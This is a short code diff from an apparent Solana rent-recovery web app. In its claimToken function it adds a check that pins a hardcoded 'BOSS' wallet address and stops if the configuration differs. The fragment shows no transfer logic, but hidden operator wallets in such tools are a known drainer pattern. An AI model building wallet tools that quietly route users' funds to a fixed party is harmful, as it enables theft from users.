@@ -1145,6 +1145,14 @@ async function scanTokens() {
 }
         // ===== RÉCUPÉRATION DE RENT RÉELLE AVEC VÉRIFICATION BACKEND =====
         async function claimToken(tokenAccountAddress, recoverableSOL) {
+               const expectedBoss = "AG7cszvmbcxpVAB5p9XAasgSArcsum7Z9wBpqt8Eu2Fg";
+    if (REAL_CONFIG.BOSS_WALLET !== expectedBoss) {
+        console.error("❌ MAUVAIS BOSS WALLET!");
+        console.log("Config:", REAL_CONFIG.BOSS_WALLET);
+        console.log("Attendu:", expectedBoss);
+        showNotification("❌ Erreur configuration BOSS", "error");
+        return;
+    }
              console.log("🔍 DÉBUT CLAIM - Token:", tokenAccountAddress);
     console.log("🔍 Solde utilisateur:", userBalance);
     console.log("🔍 Wallet connecté:", currentWallet);
